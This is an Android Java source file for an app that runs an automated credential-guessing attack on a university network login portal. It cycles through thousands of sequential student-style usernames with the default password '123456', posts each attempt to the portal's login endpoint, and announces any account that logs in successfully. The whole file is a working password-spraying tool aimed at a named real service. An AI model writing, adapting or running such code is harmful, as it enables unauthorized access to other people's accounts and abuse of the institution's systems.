package pw.usual.PortalBoasting;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.Editable;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    private ToggleButton startButton;
    private TextView logArea;

    private Handler handler;
    private ExecutorService pool;
    private Editable logText;

    private View.OnClickListener onStartButtonClick = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Log.i("StartButton", "Click.");

            ToggleButton button = (ToggleButton) v;

            if (button.isChecked()){
                logText.clear();
                if (pool.isShutdown()){
                    pool = Executors.newSingleThreadExecutor();
                }
                for (int i=1; i<10000;i++){
                    pool.execute(new AttemptThread(handler, String.valueOf(70200000+i), "123456"));
                }
            }
            else{
                pool.shutdownNow();
            }
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        startButton = (ToggleButton) findViewById(R.id.StartButton);
        logArea = (TextView) findViewById(R.id.LogArea);
        handler = new MyHandler();
        pool = Executors.newSingleThreadExecutor();

        logArea.setText(logArea.getText(), TextView.BufferType.EDITABLE);
        logText = (Editable) logArea.getText();
        logArea.setMovementMethod(ScrollingMovementMethod.getInstance());
        logArea.setFocusable(true);
        logArea.requestFocus();

        startButton.setOnClickListener(onStartButtonClick);
    }

    @Override
    public void onDestroy(){
        pool.shutdown();
        super.onDestroy();
    }

    private class AttemptThread extends Thread{
        private Handler handler;
        private String user;
        private String password;

        AttemptThread(Handler handler, String user, String password){
            this.handler = handler;
            this.user = user;
            this.password = password;
        }

        @Override
        public void run(){
            HttpPost httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");

            List<NameValuePair> params=new ArrayList<>();
            params.add(new BasicNameValuePair("saved", "0"));
            params.add(new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2"));
            params.add(new BasicNameValuePair("domain", "1"));
            params.add(new BasicNameValuePair("username", user));
            params.add(new BasicNameValuePair("password", password));

            try {
                httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
                HttpResponse response = new DefaultHttpClient().execute(httpPost);

                Log.i("AttemptThread", "Run " + user + " " + password + " " + response.getStatusLine().getStatusCode());

                if (response.getStatusLine().getStatusCode() == 200){
                    JSONObject json = new JSONObject(EntityUtils.toString(response.getEntity()));
                    String status = (String)new JSONObject((String)json.get("data")).get("status");

                    Message message = handler.obtainMessage(0x56, status);
                    message.arg1 = Integer.parseInt(user);
                    message.sendToTarget();
                }
            }
            catch (Exception e){
                Log.e("Error", e.getClass().toString());
            }
        }
    }

    private class MyHandler extends Handler{
        @Override
        public void handleMessage(Message message){
            switch (message.what){
                case 0x56:{
                    Log.i("MessageHandle", String.valueOf(message.arg1) + " " + message.obj);

                    int height = logArea.getHeight();
                    logText.append(String.valueOf(message.arg1) + " " + message.obj + "\n");

                    if (logArea.getHeight() == height) {
                        logArea.scrollBy(0, logArea.getLineHeight());
                    }

                    if (message.obj.equals("succeed")){
                        pool.shutdownNow();
                        startButton.setChecked(false);

                        Toast.makeText(MainActivity.this, "User " + String.valueOf(message.arg1) + " login successed", Toast.LENGTH_LONG).show();
                    }
                }
                default:{
                    break;
                }
            }
            super.handleMessage(message);
        }
    }
}
